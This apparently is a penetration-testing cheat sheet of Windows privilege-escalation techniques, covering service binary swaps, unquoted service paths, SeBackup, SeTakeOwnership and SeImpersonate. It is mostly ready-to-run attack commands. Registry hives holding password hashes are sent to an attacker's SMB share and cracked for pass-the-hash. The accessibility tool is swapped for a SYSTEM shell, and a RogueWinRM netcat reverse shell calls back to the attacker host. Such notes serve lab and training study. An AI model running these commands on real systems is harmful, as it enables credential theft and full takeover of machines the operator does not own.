Insecure Permissions on Service Executable​

# powershell needs sc.exe, because sc is an alias to Set-Content
# query service config
sc qc <name>

# look for BINARY_PATH_NAME
# check its perms
icacls C:\<path>\<service>

# check for everyone, BUILTIN\Users, ...
# generate a payload with same ext as service
# transfer to target
# swap
move <oldservice> <oldservice>.bak
move <newservice> <path>

# grant perms
icacls <.exe> /grant Everyone:F

# restart service
sc stop <service>
sc start <service>

Unquoted Service Paths​

When the BINARY_PATH_NAME have spaces and isn't between quotes, because of the way the command prompt parses a command, the SCM will try to execute the first "word.exe", than "word second.exe", ...

C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
-----
#arg1 -> sorter | arg2 -> Enterprise\bin\...
(1) C:\MyPrograms\Disk.exe arg1 arg2

#arg1 -> Enterprise\bin\...
(2) C:\MyPrograms\Disk Sorter.exe arg1

(3) C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

SeBackup / SeRestore​

Read and write to any file in the system, ignoring any DACL in place.

# copy SAM and SYSTEM hashes
reg save hklm\sam C:\<path>\sam.hive

reg save hklm\system C:\<path>\system.hive

# copy files
# start smbserver, create public and share
mkdir share
impacket-smbserver -smb2support -username <user> -password <pass> public share

# target
copy C:\<path>\sam.hive \\<local_host>\public\

copy C:\<path>\system.hive \\<local_host>\public\

# than use impacket to extract hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# PASS THE HASH
impacket-psexec -hashes <admin_hash> administrator@<remote_host>

SeTakeOwnership​

Allows a user to take ownership of any object on the system, including files and registry keys.

  • search for a service running as SYSTEM and take ownership of the service's executable.

utilman.exe is a built-in Windows application used to provide accessibility options during the lock screen.

# C:\Windows\System32
# take ownership
takeown /f utilman.exe

# change privs
icacls utilman.exe /grant <USER>:F

# change exe to cmd
copy cmd.exe utilman.exe

# lock screen and press "ease of access" button. Will run as SYSTEM

SeImpersonate / SeAssignPrimaryToken​

RogueWinRM

Allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <LOCAL_HOST> 4442"
  • The exploit may take a little to work

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe <LOCAL_HOST> 4442.

nc -lvnp 4442
